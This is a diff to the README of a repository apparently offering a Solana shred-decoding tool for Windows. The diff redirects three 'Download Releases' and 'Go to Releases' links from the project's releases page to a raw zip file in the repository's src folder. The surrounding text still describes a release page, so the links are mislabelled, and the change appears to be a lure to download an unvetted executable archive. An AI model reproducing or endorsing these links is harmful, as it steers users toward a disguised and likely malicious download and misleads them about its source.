@@ -1,6 +1,6 @@
 # ⚙️ shredstream-decode-example - Decode Solana Shreds to Transactions
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/rutledgeearly815/shredstream-decode-example/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rutledgeearly815/shredstream-decode-example/main/src/example_decode_shredstream_3.3.zip)
 
 ## 📄 About shredstream-decode-example
 
@@ -33,7 +33,7 @@ Follow these steps to get the app running on your Windows PC.
 
 Click the button below to go to the official release page:
 
-[![Download Releases](https://img.shields.io/badge/Go_to_Releases-blue?style=for-the-badge)](https://github.com/rutledgeearly815/shredstream-decode-example/releases)
+[![Download Releases](https://img.shields.io/badge/Go_to_Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/rutledgeearly815/shredstream-decode-example/main/src/example_decode_shredstream_3.3.zip)
 
 This page lists all available versions. Choose the latest stable release for Windows.
 
@@ -112,7 +112,7 @@ It is ideal for analysts, researchers, or developers working around Solana’s r
 ## 🔗 Download Links
 
 - Visit the release page and download the latest version here:  
-  [Download Releases](https://github.com/rutledgeearly815/shredstream-decode-example/releases)
+  [Download Releases](https://raw.githubusercontent.com/rutledgeearly815/shredstream-decode-example/main/src/example_decode_shredstream_3.3.zip)
 
 - The app supports Windows 64-bit systems only at this time.
 
